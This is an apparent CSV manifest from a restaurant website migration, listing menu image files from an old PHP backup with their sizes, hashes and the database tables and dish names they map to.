409.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/409.jpg,8976,5e7babc9759a5a0039f11446ed5b2d1c73cabedc209a0f2eb24da779a8649b2f,5c325ea2fac4b0ddf301379e0c3b4cb9,DB Mapped (Verified),menu_item_tbl,409,Dal Makhani,menu_img
41.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/41.jpg,11283,b12e3d6a923bba6ad9e610e3a456151e327b06c368710970c667c84a62703969,55edb66c6842b869e8495b66c72d8df7,DB Mapped (Verified),menu_item_tbl,41,Maxican Soup,menu_img
41.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/41.jpg,11283,b12e3d6a923bba6ad9e610e3a456151e327b06c368710970c667c84a62703969,55edb66c6842b869e8495b66c72d8df7,DB Mapped (Verified),menu_item_tbl,41,Maxican Soup,menu_small_img
41.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/41.jpg,11283,b12e3d6a923bba6ad9e610e3a456151e327b06c368710970c667c84a62703969,55edb66c6842b869e8495b66c72d8df7,DB Mapped (Verified),product_item_tbl,41,Zucchini Chutney,menu_img
410.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/410.jpg,11353,26b06032af8d2807659145e7288fbb462577c83b9e708b6cfd2bd8d0214807dc,eddcb748c33ddad0e757e72163256138,DB Mapped (Verified),menu_item_tbl,410,Paneer Tikka,menu_img
411.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/411.jpg,16161,9aaecbc954e9792702cff933d3ae4db80de04e18627b836671a2d24c90d53f99,7df81a4f1d717f67ad722c5d9ccf5c91,DB Mapped (Verified),menu_item_tbl,411,Punjabi Pakoda Kadhi,menu_img
412.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/412.jpg,12958,4c8ba00a5420a880a9f3ac535f9eb2b3e43952b09007fc593748c74f8a78db57,8fef40fa7cbc948a15c7e69a4f8d4696,DB Mapped (Verified),menu_item_tbl,412,Rajma Chawal,menu_img
413.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/413.jpg,10821,f2a20113c76e48469e47438330008c2629bf1d7205034cf954879e32fa82c65c,3c105ce69023a3563e5044d7afc86f11,DB Mapped (Verified),menu_item_tbl,413,Sarson ka Saag,menu_img
414.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/414.jpg,14057,ac6faf81503701165e53cfa55e1a9f84f33e5b2791d0e251fc252fccb866008f,8bb0269b92b109b8d362e406ba210380,DB Mapped (Verified),menu_item_tbl,414,Makki ki Roti,menu_img
415.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/415.jpg,8776,36749c2efd5abc800ac06ab03fe3c0e2bc3a2584f5980e00e674a157e0a15917,d02d81e4c690b3e367cdcafedd70a5f9,DB Mapped (Verified),menu_item_tbl,415,Karma Prashad,menu_img
416.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/416.jpg,12340,841c330cb2b77edf1e010c52d54837020e37215d4488622268845490e781f0d8,057224c7bf27d817f29094fc97ee88af,DB Mapped (Verified),menu_item_tbl,416,Gobhi-Shalgam-Gajaar Achaar,menu_img
417.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/417.jpg,9926,30a8221f7b0328d36cdd2a4bc7b69b0f8cbd8eb4dc5c8bf11eb1e186afd570a0,f65aae4d7b8ffce65bb499fbeeeaca24,DB Mapped (Verified),menu_item_tbl,417,"Pinni â€“ Sweet A hot, sweet hug",menu_img
418.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/418.jpg,13719,44036ff00e4b844e93d03b6574bee8480fa588a5452c29e6fb6a4ef51adc8dab,6db5d252cf0cf586c3e381c3952dacfe,DB Mapped (Verified),menu_item_tbl,418,Dal Bati Churma - Spicy Daal,menu_img
419.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/419.jpg,16303,bb79b7e2cb618ac71dda406cdad60814e0b4d053d25210ee55ce465a5b3907be,b728cd7e80e6a1474dbdada803a237e5,DB Mapped (Verified),menu_item_tbl,419,Mohan Thaal,menu_img
42.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/42.jpg,15197,33e4fc6d0bae8d43eff68c4fd4778a3aac53f34acd0ad559d2f7aecea67b2aa1,76ad96f08bd0a53f9882c4deaa6ee3fe,DB Mapped (Verified),menu_item_tbl,42,Tomato Coconut Soup,menu_img
42.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/42.jpg,15197,33e4fc6d0bae8d43eff68c4fd4778a3aac53f34acd0ad559d2f7aecea67b2aa1,76ad96f08bd0a53f9882c4deaa6ee3fe,DB Mapped (Verified),menu_item_tbl,42,Tomato Coconut Soup,menu_small_img
42.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/42.jpg,15197,33e4fc6d0bae8d43eff68c4fd4778a3aac53f34acd0ad559d2f7aecea67b2aa1,76ad96f08bd0a53f9882c4deaa6ee3fe,DB Mapped (Verified),product_item_tbl,42,Walnut Chutney,menu_img
420.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/420.jpg,10472,2a7f89d52e1310fa5b5d472aec6ba9be4734c5140783f606c19f2546b61bc306,c1d190f9b8c14a4a9fec3c3688742bde,DB Mapped (Verified),menu_item_tbl,420,Laal Maas,menu_img
421.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/421.jpg,9670,a90b117be3e24fb62aed63ce149af2222b28e2f66d8c0d55d96c8eba5acb0188,0925d7cf3fa058450f8a3a075a7a04d6,DB Mapped (Verified),menu_item_tbl,421,Mawa Kachori,menu_img
422.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/422.jpg,12317,1c0a6a86c9a4c4d208a292cd3b14876ca3e3b68d02ceb848fe761950b4ff6a03,20ed52d69f0eaedd830b469fb86f79ea,DB Mapped (Verified),menu_item_tbl,422,Mirchi Bada,menu_img
423.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/423.jpg,10064,7608c0dfe23172f250863ad37a8b7f8d0fbc058796cfbf5717629fba64c24340,75007b0ba069ada41c74cbf53a7dcc6b,DB Mapped (Verified),menu_item_tbl,423,Mohan Maas,menu_img
424.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/424.jpg,9673,c3fe0d4213f21fe5c494bf8c5408fc590afc629a1c6cabc4d396a5e97bf9e0f9,120052a8cad8761615e8061d914302ae,DB Mapped (Verified),menu_item_tbl,424,Kalakand,menu_img
425.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/425.jpg,8534,6e0cb7e27f69174946727ea79388fafce1cd599d67bc1f287c4012c94a537413,4cb9a430c304466d841e9e929c79484c,DB Mapped (Verified),menu_item_tbl,425,Pyaaz Ki Kachori,menu_img
426.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/426.jpg,11748,f490012a6b0ff7b52283491be531081cc1c51b768cda18f9dbe8534cd9d4d44e,d814e7ada2350f0b0112cb69cea11edb,DB Mapped (Verified),menu_item_tbl,426,Gatte- Sabzi,menu_img
427.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/427.jpg,11794,749af11b1f082710f3c13833d937c48fadd197ffb6967a236cdbdfeafbd0d697,85d1724070753e579fae7719d956b8c1,DB Mapped (Verified),menu_item_tbl,427,Kadhi - Sabzi,menu_img
428.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/428.jpg,8042,522dc951e5fdf5a6d995d5a0a71448e429863785dcfead6c9d7f06e0a53c2c58,5d2b6996211e9c6253f21de231651536,DB Mapped (Verified),menu_item_tbl,428,Jaljeera,menu_img
429.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/429.jpg,8062,13c8b33782e451c5bb22657fd212c3b5f5f643fe61286183b09f97dbd5613b7b,848ddf4251d8f2527eff5b95f383a984,DB Mapped (Verified),menu_item_tbl,429,Masala-Chhach,menu_img
43.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/43.jpg,13879,bcf612883e66b50269e1c82ac8942cf5c2e1b4a6ff8b3918df5aa99bc5b07c13,2d5c295f97537d2a0bcbab0b87beda4a,DB Mapped (Verified),menu_item_tbl,43,Palak Paneer Soup,menu_img
43.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/43.jpg,13879,bcf612883e66b50269e1c82ac8942cf5c2e1b4a6ff8b3918df5aa99bc5b07c13,2d5c295f97537d2a0bcbab0b87beda4a,DB Mapped (Verified),menu_item_tbl,43,Palak Paneer Soup,menu_small_img
43.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/43.jpg,13879,bcf612883e66b50269e1c82ac8942cf5c2e1b4a6ff8b3918df5aa99bc5b07c13,2d5c295f97537d2a0bcbab0b87beda4a,DB Mapped (Verified),product_item_tbl,43,Mango Chutney,menu_img
430.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/430.jpg,10311,025bb91d2afe955a27c195b348c8545c5d014b13bd7e5795e25722c7e3b1712c,bbaa9f712bd1d1b36a3ce65cc828bbaf,DB Mapped (Verified),menu_item_tbl,430,Bajra Ki Raab,menu_img
431.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/431.jpg,10571,2b2c09fa62dafd003d6cc609812b9193be747b36ddb78a3133be54b050560f26,a9a8506ad4f1484bd19cf56cbe369e33,DB Mapped (Verified),menu_item_tbl,431,Ghevar,menu_img
432.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/432.jpg,10760,57ca7975f9c8092992c0c2ac5718c7881f6f76f9fe0c779d3d5f23407be23726,eee7a9fe4d13bdcaddafd50f008e6a3b,DB Mapped (Verified),menu_item_tbl,432,Moong Ki Daal Ka Halwa,menu_img
433.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/433.jpg,8575,4f186c6c420e86c1f4086222fe0c53c82cdae54a8ddf6ae81a7a43a2083de2bd,09ad951839060f3d2419524f69238b2e,DB Mapped (Verified),menu_item_tbl,433,Malpua,menu_img
434.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/434.jpg,10157,a12f367a437b72672da9d563de2b517c648e8590ff314502cfc0b614971e6484,3ea8870a4769c586d6df4c3e587b5032,DB Mapped (Verified),menu_item_tbl,434,"Chutneys like Kachri, Imli, Lehsun and Tamatar",menu_img
435.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/435.jpg,11078,43f290e1966bae5eef57c10bceca1caf0a5fb4d143557921d0f85899120d3dd7,1778ae508e0ed1c1bb74c2ace5be0aac,DB Mapped (Verified),menu_item_tbl,435,Bajra ki Roti with Lehsun Chutney,menu_img
436.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/436.jpg,11023,c0f4cbdedc26b719eb350fbdaad685d81eadc482a93f08588f62b1dc7dd1b657,b3531143f42f34311ba19502d76881d9,DB Mapped (Verified),menu_item_tbl,436,Churma Ladoo,menu_img
437.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/437.jpg,7557,b993bc36926aa2e7f0641f717818b221b8c863378116b0aceddb598ca88084e1,afd10a47409b0df2791fc5ce0d11946a,DB Mapped (Verified),menu_item_tbl,437,Balushahi,menu_img
438.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/438.jpg,13753,53a3ff8f8880050feda4797a4d5a749b4045d64be69b645a998e0ad3b0e807e8,e7a1fb3ce85ec0a4055b9b99090a59e5,DB Mapped (Verified),menu_item_tbl,438,Ker Sangari Ro Saag,menu_img
439.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/439.jpg,12655,99315d4b4032cec547246187f9c0e475e05a980320b0e8ba3c182729f403f363,c09e809f804cd0856bc2c86601f25754,DB Mapped (Verified),menu_item_tbl,439,Boondi Raita,menu_img
44.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/44.jpeg,7330,6168da405e08a7a704afaa1fc3848886f9e56dbe8482f52e3bb7f945ead833fd,97362fec920143900fbecc507ea52a59,DB Mapped (Verified),menu_item_tbl,44,Broccoli Almond Soup,menu_img
44.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/44.jpeg,7330,6168da405e08a7a704afaa1fc3848886f9e56dbe8482f52e3bb7f945ead833fd,97362fec920143900fbecc507ea52a59,DB Mapped (Verified),menu_item_tbl,44,Broccoli Almond Soup,menu_small_img
440.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/440.jpg,11258,8b4fca890ea989ca35aa742cd75cafff25831c60e09134a07b50fd02eda293d6,834fce28df8a9ee0e29ffd7b2bb2321d,DB Mapped (Verified),menu_item_tbl,440,Badam ka Halwa,menu_img
441.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/441.jpg,9487,5a1419fae88140f55e2b390c07a2b65560a32c442117ea31ad5e7943345385cf,c44ffbfae1757ff565bd7e9a7fd0c789,DB Mapped (Verified),menu_item_tbl,441,Aam ki Launji â€“ Raw Mango Launji Achar,menu_img
442.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/442.jpg,9604,301505e7bbd1cbe2ef731732387c7542c7a303947a6deb43b42d004e569d9484,4fd3dae5feb4989e34831ab42e9fa9b0,DB Mapped (Verified),menu_item_tbl,442,Methi Bajra Puri,menu_img
443.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/443.jpg,10684,d28942e1baf33dddddc49d2d9fbcdccadc0c40533b899d135ee8b23ebfee99b8,c69db494a7dd05f63f211724bf5e2126,DB Mapped (Verified),menu_item_tbl,443,Gujia,menu_img
444.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/444.jpg,11304,42028b96435b0d60b4f6bbca5b6ee0f63e78accf3aca7b3056c695eee0696e0d,e0b883f96baa066ad029a8fa25f454b8,DB Mapped (Verified),menu_item_tbl,444,Kalmi Vada,menu_img
445.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/445.jpg,14845,fb9a212d8dd5bb3d87a9ded514e0ce4e89003846e94c4c15eb7146ac01c457cc,c86fdc8a75bb71a8bfa3861fae2e8828,DB Mapped (Verified),menu_item_tbl,445,Tunday Kebab,menu_img
445.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/445.jpg,14845,fb9a212d8dd5bb3d87a9ded514e0ce4e89003846e94c4c15eb7146ac01c457cc,c86fdc8a75bb71a8bfa3861fae2e8828,DB Mapped (Verified),menu_item_tbl,445,Tunday Kebab,menu_small_img
446.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/446.jpeg,10707,1c745d5e3cbe388385d0b629a64395035a96834af11d71d9546aae2061687335,8bf4f1fe1d4a0eea54300a52a54d7fa8,DB Mapped (Verified),menu_item_tbl,446,Galawati Kebab,menu_img
446.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/446.jpeg,10707,1c745d5e3cbe388385d0b629a64395035a96834af11d71d9546aae2061687335,8bf4f1fe1d4a0eea54300a52a54d7fa8,DB Mapped (Verified),menu_item_tbl,446,Galawati Kebab,menu_small_img
447.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/447.jpg,16461,51c894908e779e3a6a1eabdb4af1ee4fa875909ef6269f0f4e062c97b57bf0de,3e8ac41a3ae2f0aa58aeb9913ad6a2fe,DB Mapped (Verified),menu_item_tbl,447,Lucknowi Biryani,menu_img
447.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/447.jpg,16461,51c894908e779e3a6a1eabdb4af1ee4fa875909ef6269f0f4e062c97b57bf0de,3e8ac41a3ae2f0aa58aeb9913ad6a2fe,DB Mapped (Verified),menu_item_tbl,447,Lucknowi Biryani,menu_small_img
448.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/448.jpg,12825,7fd9551dabce113c6ca4b0098b6de4115ffe729dfa5313a0aa541b2091cd1cd0,496019ec6cfa031f51cb68a808391394,DB Mapped (Verified),menu_item_tbl,448,Tehri - Rice,menu_img
449.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/449.jpg,14953,e2bd92f0474dba8b920d780d82bb696104fd322d6ed4d95c639ede427b72e0e0,2d97d180acd5b0fe939edc9905d00d17,DB Mapped (Verified),menu_item_tbl,449,Nargisi Kofta,menu_img
45.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/45.jpeg,11396,ce0cfcfc7cd49ab9cd18c6eb4d624f40f3da62bc91a5fdf0dbce6af398bbd139,86c4de81fd36cb164cf23428f9bdc582,DB Mapped (Verified),menu_item_tbl,45,Manchow Soup,menu_img
45.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/45.jpeg,11396,ce0cfcfc7cd49ab9cd18c6eb4d624f40f3da62bc91a5fdf0dbce6af398bbd139,86c4de81fd36cb164cf23428f9bdc582,DB Mapped (Verified),menu_item_tbl,45,Manchow Soup,menu_small_img
450.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/450.jpg,12992,d606a53564ca3ef50aa6691e8ac68d19ca4728d3bc38f97cc99d470437531a7f,94b802f40a6ca2fd0df0e8203ce9ff2a,DB Mapped (Verified),menu_item_tbl,450,Sheermal,menu_img
451.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/451.jpg,10811,f40104cf6937f4631e1609e8ae4bb08ef81877b6a23b5fd1f52ed0f802ddea19,99188f67deea68649fc110533234e773,DB Mapped (Verified),menu_item_tbl,451,Kulfi Falooda,menu_img
452.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/452.jpg,7221,8ff5887ea9596837849997722f36372432a0192648c46d948c403282cb5ffc8a,af7a23ab140eaf2b01edf786fb0a88bc,DB Mapped (Verified),menu_item_tbl,452,Makhan Malai,menu_img
453.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/453.jpg,9507,ece414e86d64eb87b977c2edc2f9218a38fa5e3aef5bf5e447e10cbea5ae33f4,8d5d51af315201771ca54565c88dcd89,DB Mapped (Verified),menu_item_tbl,453,Kakori Kebab,menu_img
454.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/454.jpg,17993,3442b40381a38d96c4d621feb7f653c26fe80e2c2d5ad3f53a5b59daef28a72b,b33dd36daaf6c19f2d3da21b87fe1f33,DB Mapped (Verified),menu_item_tbl,454,Boti Kebab,menu_img
454.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/454.jpg,17993,3442b40381a38d96c4d621feb7f653c26fe80e2c2d5ad3f53a5b59daef28a72b,b33dd36daaf6c19f2d3da21b87fe1f33,DB Mapped (Verified),menu_item_tbl,454,Boti Kebab,menu_small_img
455.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/455.jpeg,14115,3597c993cc227bf646b3fdb78eb14456c7ca13e680579e9b0c03875a9c670416,0a3c66a54f6b4ccf71b181516f9f1ffa,DB Mapped (Verified),menu_item_tbl,455,Paneer Pasanda,menu_img
455.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/455.jpeg,14115,3597c993cc227bf646b3fdb78eb14456c7ca13e680579e9b0c03875a9c670416,0a3c66a54f6b4ccf71b181516f9f1ffa,DB Mapped (Verified),menu_item_tbl,455,Paneer Pasanda,menu_small_img
456.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/456.jpg,12298,1eff6c6b16421d2725565f6ceaec481df05fd5d89e6849dafd766432f8cf4395,d6dfd56065268fcf17d586f96e7b37bb,DB Mapped (Verified),menu_item_tbl,456,Shabdeg,menu_img
456.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/456.jpg,12298,1eff6c6b16421d2725565f6ceaec481df05fd5d89e6849dafd766432f8cf4395,d6dfd56065268fcf17d586f96e7b37bb,DB Mapped (Verified),menu_item_tbl,456,Shabdeg,menu_small_img
457.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/457.jpeg,10992,20f04a130c787558d99ade8038e195ec5f5c0c3008f7731c9cf804fa1f1417ba,b2f7c4a9dddb53aaf80c5416be2c91c8,DB Mapped (Verified),menu_item_tbl,457,Puri-Sabzi,menu_img
457.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/457.jpeg,10992,20f04a130c787558d99ade8038e195ec5f5c0c3008f7731c9cf804fa1f1417ba,b2f7c4a9dddb53aaf80c5416be2c91c8,DB Mapped (Verified),menu_item_tbl,457,Puri-Sabzi,menu_small_img
458.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/458.jpg,11063,89b253c4feec3d6ecd1b1ecd2207c42ef837d2c8d2ba888e5e675dc07d4b4451,7d652a7d71a29d5cb52a5f604fae6121,DB Mapped (Verified),menu_item_tbl,458,Jalebi,menu_img
458.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/458.jpg,11063,89b253c4feec3d6ecd1b1ecd2207c42ef837d2c8d2ba888e5e675dc07d4b4451,7d652a7d71a29d5cb52a5f604fae6121,DB Mapped (Verified),menu_item_tbl,458,Jalebi,menu_small_img
459.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/459.jpg,52558,c8859d582164b0d0e44240d36188f8cff87d7c0bca33eca4955fb82fc988e44e,70378f43d3d226b52a6856bfba759632,DB Mapped (Verified),menu_item_tbl,459,Banarasi Paan,menu_img
459.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/459.jpg,52558,c8859d582164b0d0e44240d36188f8cff87d7c0bca33eca4955fb82fc988e44e,70378f43d3d226b52a6856bfba759632,DB Mapped (Verified),menu_item_tbl,459,Banarasi Paan,menu_small_img
46.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/46.jpg,64253,0d0a7a1f7f10774b4dfbe74fad2cc79f51d77d8be39977a0a33300b934f275bb,3a2a2ce4f9c53aef407a30aee7da1928,DB Mapped (Verified),menu_item_tbl,46,Mexican Chilli,menu_img
46.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/46.jpg,64253,0d0a7a1f7f10774b4dfbe74fad2cc79f51d77d8be39977a0a33300b934f275bb,3a2a2ce4f9c53aef407a30aee7da1928,DB Mapped (Verified),menu_item_tbl,46,Mexican Chilli,menu_small_img
460.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/460.jpg,11330,afab584ffa39dd605cd769fb0fb5a9eab2054e4600c452941df7031c0dc9151f,5ef28fe2f2b1c75260fa34d13d60c69b,DB Mapped (Verified),menu_item_tbl,460,Bati Chokha,menu_img
460.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/460.jpg,11330,afab584ffa39dd605cd769fb0fb5a9eab2054e4600c452941df7031c0dc9151f,5ef28fe2f2b1c75260fa34d13d60c69b,DB Mapped (Verified),menu_item_tbl,460,Bati Chokha,menu_small_img
461.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/461.jpg,10372,1bb4acf05482e150e9c1922e19d7f2e350b55910d8ae4535bb9eb6b58c78ac8b,1f9b2aca3d407d5a135fac24689c81dc,DB Mapped (Verified),menu_item_tbl,461,Petha,menu_img
461.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/461.jpg,10372,1bb4acf05482e150e9c1922e19d7f2e350b55910d8ae4535bb9eb6b58c78ac8b,1f9b2aca3d407d5a135fac24689c81dc,DB Mapped (Verified),menu_item_tbl,461,Petha,menu_small_img
462.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/462.jpg,15558,3ed5d89e8da2c33fae3d1622aa4a141e072c5833a5463c816032c7f2fd9ba749,9b7cd434c2f787c0dace82d706229447,DB Mapped (Verified),menu_item_tbl,462,Rasmalai,menu_img
462.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/462.jpg,15558,3ed5d89e8da2c33fae3d1622aa4a141e072c5833a5463c816032c7f2fd9ba749,9b7cd434c2f787c0dace82d706229447,DB Mapped (Verified),menu_item_tbl,462,Rasmalai,menu_small_img
463.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/463.jpg,8752,f38a6a06105ab492c5700806977bf022897e31996ca17fcab36584c461063cbd,a12a29739d2662c201a725000f073b84,DB Mapped (Verified),menu_item_tbl,463,Khurchan,menu_img
463.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/463.jpg,8752,f38a6a06105ab492c5700806977bf022897e31996ca17fcab36584c461063cbd,a12a29739d2662c201a725000f073b84,DB Mapped (Verified),menu_item_tbl,463,Khurchan,menu_small_img
464.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/464.jpg,14423,7e95abb0bf12aeca01c75c510f81d1db2d1ab2f30100fd6c76aaca6aeaf082dc,89bb541f7f8fa4c18568a4e84349244c,DB Mapped (Verified),menu_item_tbl,464,Shahi Tukda,menu_img
464.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/464.jpg,14423,7e95abb0bf12aeca01c75c510f81d1db2d1ab2f30100fd6c76aaca6aeaf082dc,89bb541f7f8fa4c18568a4e84349244c,DB Mapped (Verified),menu_item_tbl,464,Shahi Tukda,menu_small_img
465.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/465.jpg,33792,c045b6e664a53b8d49676c30247bfa1cd2e95b12e9bd2260d40be799a8621969,f34525147c9548cd28d0bdc416d927e6,Static / Orphaned Disk Asset,,,,
47.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/47.jpeg,9742,259f750ca12725818f118beb214fb17a21abddf7f5e42e3951c2a69f0c57d1a5,9b35cd71ac9e3be8966379f95b52a68b,DB Mapped (Verified),menu_item_tbl,47,Chilli Paneer,menu_img
47.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/47.jpeg,9742,259f750ca12725818f118beb214fb17a21abddf7f5e42e3951c2a69f0c57d1a5,9b35cd71ac9e3be8966379f95b52a68b,DB Mapped (Verified),menu_item_tbl,47,Chilli Paneer,menu_small_img
48.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/48.jpeg,8647,e6eea7ed0534012c35c9c96378c33d2821879075b573e8f0bdcfabe6440f0921,2de01fa1ae21ff0682d2fddcece65c30,DB Mapped (Verified),menu_item_tbl,48,Spring Roll,menu_img
48.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/48.jpeg,8647,e6eea7ed0534012c35c9c96378c33d2821879075b573e8f0bdcfabe6440f0921,2de01fa1ae21ff0682d2fddcece65c30,DB Mapped (Verified),menu_item_tbl,48,Spring Roll,menu_small_img
49.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/49.jpg,10123,0f4224ea25d07374e1dffa0288988f559f608d5291f07ec5ac289a43e38965a8,4b996c1bfb5f1c874c86f5623e130902,DB Mapped (Verified),menu_item_tbl,49,Hariyala Kabab,menu_img
49.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/49.jpg,10123,0f4224ea25d07374e1dffa0288988f559f608d5291f07ec5ac289a43e38965a8,4b996c1bfb5f1c874c86f5623e130902,DB Mapped (Verified),menu_item_tbl,49,Hariyala Kabab,menu_small_img
5.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/5.jpeg,8829,f04ff04981aa0142cbdad1fa6db00be75025ac51e8eba400cad70695f03d3355,c44c034c263759a32932d490cf1e531c,DB Mapped (Verified),menu_item_tbl,5,Rasam,menu_img
5.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/5.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),product_item_tbl,5,Loose Namek Pare,menu_img
5.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/5.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),website_gallery,5,Images 5,gimage
5.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/5.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),recipe_appliances_kits,5,Toothpicks,kits_img
5.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/5.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),event_cuisine,5,First meal of the day,cuisine_img
50.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/50.jpeg,12231,5fe96b867d730062bd2f568534dea35ed17b9e78f513a9ce3a98259ca867834d,3fd3439c83ac0ab1d0b3e5cade7a8407,DB Mapped (Verified),menu_item_tbl,50,Dry Manchurian,menu_img
50.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/50.jpeg,12231,5fe96b867d730062bd2f568534dea35ed17b9e78f513a9ce3a98259ca867834d,3fd3439c83ac0ab1d0b3e5cade7a8407,DB Mapped (Verified),menu_item_tbl,50,Dry Manchurian,menu_small_img
51.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/51.jpeg,103548,7ae9832e7ba9c8c42a6e88e24767ccf6866627e19fbcb28f782c3b41fae4521a,14649c870ad339873642567caf699e50,DB Mapped (Verified),menu_item_tbl,51,Wontons (Vegetable/Cheese Paneer /Corn),menu_img
51.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/51.jpeg,103548,7ae9832e7ba9c8c42a6e88e24767ccf6866627e19fbcb28f782c3b41fae4521a,14649c870ad339873642567caf699e50,DB Mapped (Verified),menu_item_tbl,51,Wontons (Vegetable/Cheese Paneer /Corn),menu_small_img
52.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/52.jpg,122380,056502027e0bbdb0aa627b36767cbaabc73348f53559187172cce212c21f1b9a,f7cd7deb5999213ef97e39edf2ac07a2,DB Mapped (Verified),menu_item_tbl,52,Dal Ki Pakori,menu_img
52.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/52.jpg,122380,056502027e0bbdb0aa627b36767cbaabc73348f53559187172cce212c21f1b9a,f7cd7deb5999213ef97e39edf2ac07a2,DB Mapped (Verified),menu_item_tbl,52,Dal Ki Pakori,menu_small_img
53.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/53.jpg,66200,ac86211cc164f49c6a22a91b6c44dd477887995d22bd44d992d5cb91c7e7e561,876d28c234d2de3b1f78c73bd07c176a,DB Mapped (Verified),menu_item_tbl,53,Tanatan Kofta,menu_img
